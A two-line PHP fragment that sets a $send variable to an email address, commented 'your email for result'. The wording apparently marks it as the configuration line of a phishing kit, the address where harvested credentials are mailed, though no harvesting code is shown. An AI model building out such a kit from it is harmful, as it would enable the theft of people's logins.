<?php
$send="ade@yahoo.com"// your email for result
?>